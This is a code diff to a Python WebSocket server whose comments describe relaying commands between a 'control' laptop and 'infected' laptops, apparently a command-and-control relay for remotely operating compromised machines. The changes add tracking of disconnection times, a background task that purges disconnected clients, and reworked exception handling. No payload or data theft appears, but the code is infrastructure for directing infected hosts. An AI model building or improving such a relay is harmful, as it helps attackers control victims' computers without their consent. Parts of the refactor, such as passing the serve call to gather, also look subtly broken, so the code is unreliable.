@@ -23,14 +23,12 @@ messages = []
 # Message retention time (1 day)
 MESSAGE_RETENTION_PERIOD = timedelta(days=1)
 
-
 # Utility function to clean up old messages
 def cleanup_old_messages():
     global messages
     cutoff = datetime.now() - MESSAGE_RETENTION_PERIOD
     messages[:] = [msg for msg in messages if msg['command_time'] > cutoff]
     logger.info("Cleaned up messages.", extra={"remaining_messages": len(messages)})
-
 
 # Assign a unique ID to each new connection
 async def register_client(websocket, role, client_id, data=None):
@@ -39,15 +37,15 @@ async def register_client(websocket, role, client_id, data=None):
         'last_seen': datetime.now(),
         'role': role,
         'data': data,
-        'messages': []
+        'messages': [],
+        'disconnected_at': None  # Track disconnection time
     }
     logger.info("Registered new client.", extra={"role": role, "client_id": client_id, "data": data})
 
-
 # Relay messages between control and infected laptops
 async def relay_messages(websocket, client_id, role):
-    while True:
-        try:
+    try:
+        while True:
             message = await websocket.recv()
             data = json.loads(message)
             logger.info("Received message from client.", extra={"client_id": client_id, "role": role, "data": data})
@@ -86,8 +84,7 @@ async def relay_messages(websocket, client_id, role):
             elif data.get("type") == "response" and role == "infected":
                 command_id = data['command_id']
                 response = data['response']
-                logger.info("Processing response for command ID.",
-                            extra={"command_id": command_id, "response": response})
+                logger.info("Processing response for command ID.", extra={"command_id": command_id, "response": response})
 
                 # Find the original command and update it with the response
                 for msg in messages:
@@ -118,13 +115,28 @@ async def relay_messages(websocket, client_id, role):
                 await websocket.send(json.dumps(response))
                 logger.info("Sent client list to controller.", extra={"clients_list": clients_list})
 
-        except websockets.ConnectionClosed:
-            logger.info("Client disconnected.", extra={"client_id": client_id, "role": role})
-            del clients[client_id]
-            break
-        except Exception as e:
-            logger.error("Exception occurred.", exc_info=True, extra={"client_id": client_id})
+    except websockets.ConnectionClosedOK:
+        logger.info("Client disconnected gracefully.", extra={"client_id": client_id, "role": role})
+        clients[client_id]['disconnected_at'] = datetime.now()
 
+    except Exception as e:
+        logger.error("Exception occurred in relay_messages.", exc_info=True, extra={"client_id": client_id})
+
+# Delayed removal of disconnected clients
+async def remove_disconnected_clients():
+    while True:
+        now = datetime.now()
+        to_remove = []
+
+        for client_id, client in clients.items():
+            if client['disconnected_at'] and now - client['disconnected_at'] > timedelta(seconds=10):
+                to_remove.append(client_id)
+
+        for client_id in to_remove:
+            logger.info("Removing disconnected client.", extra={"client_id": client_id})
+            del clients[client_id]
+
+        await asyncio.sleep(5)  # Check for disconnected clients every 5 seconds
 
 # Handle new connections
 async def connection_handler(websocket, path):
@@ -142,10 +154,9 @@ async def connection_handler(websocket, path):
     except websockets.ConnectionClosed:
         logger.info("Connection closed for client.", extra={"client_id": client_id if client_id else 'unknown'})
         if client_id in clients:
-            del clients[client_id]
+            clients[client_id]['disconnected_at'] = datetime.now()
     except Exception as e:
         logger.error("Exception occurred in connection handler.", exc_info=True)
-
 
 # Function to get the local IP address of the server
 def get_local_ip():
@@ -159,7 +170,6 @@ def get_local_ip():
         s.close()
     return ip
 
-
 # Start the WebSocket server
 async def main():
     ip_address = get_local_ip()
@@ -167,9 +177,10 @@ async def main():
 
     logger.info("Server listening.", extra={"ip": ip_address, "port": port})
 
-    async with websockets.serve(connection_handler, "0.0.0.0", port):
-        await asyncio.Future()  # Run forever
+    server_task = websockets.serve(connection_handler, "0.0.0.0", port)
+    remove_task = remove_disconnected_clients()
 
+    await asyncio.gather(server_task, remove_task)
 
 if __name__ == "__main__":
     asyncio.run(main())
